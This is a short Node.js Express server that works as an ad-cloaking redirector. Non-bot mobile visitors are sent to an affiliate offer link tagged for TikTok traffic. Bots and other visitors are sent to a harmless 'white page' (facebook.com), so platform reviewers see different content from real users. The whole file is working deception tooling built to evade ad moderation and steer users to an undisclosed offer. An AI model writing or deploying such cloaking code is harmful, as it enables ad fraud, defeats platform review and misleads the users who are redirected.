const express = require("express");
const useragent = require('express-useragent');
const app = express();
app.use(useragent.express());

const OFFER = 'https://ttdomen.top/click?o=2&a=1252&aff_param1=tiktok';

const WHITE_PAGE = 'https://www.facebook.com/';

let counter = 0;

app.use('*', function (request, response, next) {
    try {
        const userAgent = request.get('user-agent');
        const platform = request.useragent.platform;

        const isBotDefinition = !!userAgent.toString().toLowerCase().includes('bot');

        if (!isBotDefinition && (
            platform.toLowerCase().includes('iphone') ||
            platform.toLowerCase().includes('android') ||
            platform.toLowerCase().includes('ipad')
        )) {
            counter++;
            console.log(`[${counter}][${platform}] OFFER`);
            response.redirect(OFFER);
        } else {
            console.log('[BOT] WHITE PAGE');
            response.redirect(WHITE_PAGE);
        }
    } catch (e) {
        console.error(e);
        console.log('NO_USER_AGENT[BOT] WHITE PAGE');
        response.redirect(WHITE_PAGE);
        next(e);
    }
});

app.listen(8082);
